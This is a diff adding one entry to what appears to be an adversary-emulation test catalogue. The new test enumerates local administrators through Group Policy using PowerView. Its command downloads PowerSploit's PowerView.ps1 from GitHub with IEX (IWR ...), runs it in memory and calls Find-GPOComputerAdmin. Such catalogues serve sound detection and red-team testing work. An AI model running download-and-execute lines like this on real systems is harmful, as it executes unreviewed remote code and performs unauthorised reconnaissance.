@@ -23682,6 +23682,24 @@ discovery:
           Invoke-EnumerateLocalAdmin  -Verbose
 
 '
+    - name: Find Local Admins via Group Policy (PowerView)
+      auto_generated_guid: 64fdb43b-5259-467a-b000-1b02c00e510a
+      description: 'takes a computer and determines who has admin rights over it through
+        GPO enumeration. Upon execution, information about the machine will be displayed.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        computer_name:
+          description: hostname of the computer to analyze
+          type: Path
+          default: "$env:COMPUTERNAME"
+      executor:
+        name: powershell
+        elevation_required: false
+        command: 'IEX (IWR ''https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1'');
+          Find-GPOComputerAdmin -ComputerName #{computer_name} -Verbose'
   T1057:
     technique:
       x_mitre_data_sources:
